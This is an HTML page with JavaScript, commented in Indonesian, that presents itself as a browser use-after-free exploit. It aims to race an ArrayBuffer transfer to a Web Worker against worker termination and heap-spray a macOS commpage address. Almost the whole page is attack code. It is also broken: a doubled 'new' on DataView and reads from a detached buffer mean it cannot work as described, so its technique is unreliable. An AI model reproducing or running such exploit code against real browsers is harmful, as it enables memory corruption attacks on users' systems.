<!DOCTYPE html>
<html>
<head>
    <title>PostMessage Transfer Lifecycle Attack</title>
</head>
<body>

    <h1>PostMessage Transfer UAF Attack (Commpage Target)</h1>
    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
    <p id="status">INIT: Mempersiapkan Worker dan Transfer...</p>
    <div id="log"></div>

    <script>
        // --- KONSTANTA COMM PAGE ---
        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
        
        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);

        let worker = null;
        let victimBuffer = null;
        let payloadHolders = []; 

        function log(message) {
            document.getElementById('log').innerHTML += '<div>' + message + '</div>';
        }

        // --- FUNGSI HEAP SPRAY PAYLOAD ---
        function sprayPayload() {
            const SPRAY_COUNT = 500;
            const PAYLOAD_SIZE = 64; 

            for (let i = 0; i < SPRAY_COUNT; i++) {
                let payloadArray = new Float64Array(PAYLOAD_SIZE);
                payloadArray[0] = HIGH_WORD; 
                payloadArray[1] = LOW_WORD;
                payloadArray[2] = 1337.0 + i; 
                payloadHolders.push(payloadArray); 
            }
            log(`Phase Spray: ${SPRAY_COUNT} Payload dimasukkan.`);
        }

        // --- FUNGSI UTAMA ATTACK ---
        function runTransferAttack() {
            log("Phase 1: Membuat Objek Korban dan Worker.");
            
            // 1. Objek Korban (Victim Buffer)
            // ArrayBuffer adalah objek yang dapat ditransfer (ownership berpindah)
            victimBuffer = new ArrayBuffer(512); 
            let victimView = new new DataView(victimBuffer);
            victimView.setUint32(0, 0xBBBBBBBB, true); // Pola unik

            // 2. Worker (Attacker Thread)
            worker = new Worker('worker_transfer.js');
            worker.postMessage({ cmd: 'setup' });

            // 3. Memicu Transfer dan UAF Race
            log("Phase 2: Memicu Transfer Buffer dan Lifecycle Confusion...");
            
            // Waktu Kritis: Transfer (perpindahan pointer C++ antar thread)
            worker.postMessage({ cmd: 'transfer', buffer: victimBuffer, low: LOW_WORD, high: HIGH_WORD }, [victimBuffer]);
            
            // Setelah dipostMessage, victimBuffer menjadi "detached" (diputus/invalid) di thread utama.
            // Pointer C++-nya sekarang sedang dalam proses penanganan oleh Worker.

            // 4. Trigger Race dan Corrupt Destructor
            // HENTIKAN Worker segera setelah transfer dipost. Ini memaksa C++ WebKit 
            // untuk membersihkan thread Worker dan objek yang sedang diproses.
            setTimeout(() => {
                log("Phase 3: TERMINATE Worker (Memaksa Destructor Cleanup!).");
                worker.terminate();
                
                // Lakukan spray di thread utama, berharap menimpa memori yang baru di-free oleh terminate
                sprayPayload();
                
                // Trigger UAF (Akses victimBuffer yang sudah detached/freed)
                log("Phase 4: Mencoba Trigger UAF pada Buffer yang Detached/Freed...");
                try {
                    // Akses properti view pada buffer yang sudah ditransfer (detached) dan kemudian di-free oleh terminate.
                    let check = victimView.getUint32(0, true); 
                    log(`Dereference: Nilai dibaca dari buffer lama: 0x${check.toString(16)}`);
                    
                    // Jika tidak crash, coba alokasi objek baru yang menimpa memori lama
                    let attackerView = new DataView(new ArrayBuffer(512));
                    let finalRead = attackerView.getUint32(0, true);
                    
                    log(`Final Read: 0x${finalRead.toString(16)}`);
                    
                } catch (e) {
                    log("JS Error: " + e.message + " - Menunggu Segfault OS.");
                }

            }, 50); // Jarak waktu yang sangat singkat untuk memicu race
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('status').textContent = 'Memulai rangkaian Transfer UAF...';
            setTimeout(runTransferAttack, 50);
            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah UAF Antar-Thread.';
        });

    </script>
</body>
</html>
